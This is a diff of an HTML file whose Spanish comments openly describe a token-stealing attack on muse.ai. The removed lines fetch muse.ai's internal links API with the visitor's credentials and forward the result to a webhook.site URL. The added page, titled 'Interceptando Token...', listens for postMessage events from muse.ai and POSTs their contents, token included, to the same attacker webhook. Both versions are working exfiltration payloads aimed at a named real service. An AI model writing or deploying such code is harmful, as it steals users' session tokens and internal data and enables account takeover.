@@ -1,9 +1,24 @@
-<script>
-    const webhookUrl = "https://webhook.site/e223390b-32c0-4bfa-ab49-15cc45e09f7a";
-    
-    // Intentar acceder a la API interna de Muse (si el bot tiene un token de sistema)
-    fetch("https://muse.ai/api/internal/links", { credentials: 'include' })
-        .then(res => res.text())
-        .then(data => fetch(`${webhookUrl}?internal_api=true&data=${encodeURIComponent(data)}`))
-        .catch(e => fetch(`${webhookUrl}?internal_api_fail=true&error=${e.message}`));
-</script>
+<!DOCTYPE html>
+<html>
+<body>
+    <h2>Interceptando Token...</h2>
+    <script>
+        const webhookUrl = "https://webhook.site/e223390b-32c0-4bfa-ab49-15cc45e09f7a";
+
+        // 1. Escuchamos CUALQUIER mensaje que venga del padre
+        window.addEventListener("message", (event) => {
+            // 2. Solo nos interesan los mensajes de muse.ai (o de cualquiera, si el atacante es listo)
+            if (event.origin === "https://muse.ai") {
+                const data = JSON.stringify(event.data);
+                
+                // 3. Enviamos el mensaje (y el token) al webhook del atacante
+                fetch(`${webhookUrl}?bridge_token_leak=true`, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: data
+                });
+            }
+        });
+    </script>
+</body>
+</html>
